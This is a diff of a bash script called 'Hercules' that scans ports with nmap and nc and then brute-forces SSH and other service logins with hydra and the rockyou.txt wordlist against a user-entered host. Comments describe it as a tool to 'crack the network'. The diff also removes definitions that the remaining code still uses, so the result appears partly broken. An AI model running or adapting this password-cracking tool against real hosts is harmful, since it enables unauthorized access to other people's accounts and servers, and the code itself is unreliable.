@@ -1,34 +1,7 @@
 #!/bin/bash
-#imports the file with the necessary things it need to work properly 
 
+#holds the file that contains importent funcitons for the porgram to work
 source DontEdit.sh
-
-GREEN='\033[0;32m'
-RED='\033[0;31m'
-NC='\033[0m' # No Color
-
-# Root user
-root=0
-
-# the array that holds nothing in it
-empty=("")
-
-alphabet=("a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m" "n" "o" "p" "q" "r" "s" "t" "u" "v" "w" "x" "y" "z")
-
-# The yes array that contains the yes input
-yes=("yes" "YES" "y" "Y")
-
-# The array that contains the exit input
-exit=("exit" "quit" "EXIT" "QUIT" "STOP" "stop")
-
-# Gets the current time in a 12-hour format
-CURRENT_TIME=$(date +"%I:%M:%S %p")
-
-# Gets current date in mm/dd/yyyy format
-CURRENT_DATE=$(date +"%m/%d/%Y")
-
-# List of required packages/commands (separated by spaces)
-required_packages=("nmap" "hydra" "ssh" "mysql")
 
 # Function to check if a command exists
 command_exists() {
@@ -68,7 +41,7 @@ else
         clear
         if [[ $EUID -ne $root ]]; then
             # Error message if not running as root
-            echo "ERROR:root:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
+            echo "ERROR:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
             echo "TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}"
             exit
         else
@@ -78,7 +51,7 @@ else
             clear
 
             # Tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
-            Hercules() {
+            LocalHercules() {
                 # The logo of the program
                 figlet -f slant "Hercules"
                 echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'"
@@ -86,10 +59,8 @@ else
                 read -p ">>> " service
                 
                 if [[ $service == "ALL" || $service == "all" ]]; then
-                  # Tells the user that it can take up to an hour to complete the scanning process
-                  echo -e "${RED}This can take up to 1 hour to complete.${NC}"
                   # Scan the entire network and display open ports
-                  sudo nmap 127.0.0.1 -Pn -oN local.txt
+                  nmap 127.0.0.1 --system-dns -Pn -oN local.txt
                   hydra -h
                   echo "Put in Hydra first to start the script."
                   echo ""
@@ -119,28 +90,47 @@ else
 
                 else
                     # Scan specific port
-                    nmap 127.0.0.1 -p $service
+                    nmap 127.0.0.1 --system-dns -p $service
                 fi
             }
 
-            RunHackingCommand() {
+            LocalRunHackingCommand() {
                 # Break in the outputs of my code
                 echo
+                original_host=127.0.0.1
+                original_port=$service
+
+                # Check if the port is closed
+                if nc -zv "$original_host" "$original_port" >/dev/null 2>&1; then
+                    echo ""
+                else
+                    echo -e "${RED}[-]${NC} Port $original_port on $original_host is closed."
+                    # Optionally, you can choose to exit or handle closed port differently
+                    exit 1
+                fi
+
                 # Services to crack the network
                 echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
                 echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
-                read -p "Input Username: " user
-                read -p "Input Hostname: " host
+
+                # Use different variables for user input to avoid overwriting original host and port
+                read -p "Input Username: " user_input
+                read -p "Input Hostname: " host_input
+
+                # Use user input or fallback to original values if user input is empty
+                user=${user_input:-$user}
+                host=${host_input:-$original_host}
             }
 
-            RunHackingCommandWithVNC() {
+            LocalRunHackingCommandWithVNC() {
+
                 if [[ $service == 5900 || $service == "VNC" ]]; then
                     # Checks if the user has put anything in the 'Input Username' function and the hostname function
                     # If not, it will prompt the user to enter the username and hostname
                     if [[ $user == "" && $host == "" || $host == "" ]]; then
                         # No service specified, re-prompt for input
                         echo "No service specified"
-                        Hercules
+                        LocalHercules
                     # If the user inputs something in the 'Input Username' function and the hostname function,
                     # it will continue as normal
                     else
@@ -163,24 +153,23 @@ else
                         # Put the
                         echo
                         echo "Loading VNC server..."
-                        xtightvncviewer "${host}"
+                        open "vnc://${host}"
                         exit
                     fi
                 fi
             }
 
-            RunHackingCommandWithSSH() {
+            LocalRunHackingCommandWithSSH() {
                 if [[ $service == 22 || $service == "ssh" ]]; then
                     # Checks if the user has put anything in the 'Input Username' function and the hostname function
                     # If not, it will prompt the user to enter the username and hostname
                     if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                         # No service specified, re-prompt for input
                         echo "No service specified"
-                        Hercules
+                        LocalHercules
                     # If the user inputs something in the 'Input Username' function and the hostname function,
                     # it will continue as normal
                     else
-
                         # Crack SSH password
                         hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                         # Alerts the user that the computer is trying to connect to the ssh server
@@ -201,14 +190,14 @@ else
                 fi
             }
 
-            RunHackingCommandWithMySQL() {
+            LocalRunHackingCommandWithMySQL() {
                 if [[ $service == 3306 || $service == "mysql" ]]; then
                     # Checks if the user has put anything in the 'Input Username' function and the hostname function
                     # If not, it will prompt the user to enter the username and hostname
                     if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                         # No service specified, re-prompt for input
                         echo "No service specified"
-                        Hercules
+                        LocalHercules
                     # If the user inputs something in the 'Input Username' function and the hostname function,
                     # it will continue as normal
                     else
@@ -221,20 +210,20 @@ else
                 fi
             }
 
-            Hercules # Calls the Hercules function
+            LocalHercules # Calls the Hercules function
 
-            RunHackingCommand # Calls the RunHackingCommand function
+            LocalRunHackingCommand # Calls the RunHackingCommand function
 
-            RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function
+            LocalRunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function
 
-            RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function
+            LocalRunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function
 
-            RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
+            LocalRunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
         fi
     else
         clear
         # Warning message for wrong OS
-        echo "WARNING:root:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
+        echo "WARNING:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
         echo "TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
     fi
 fi
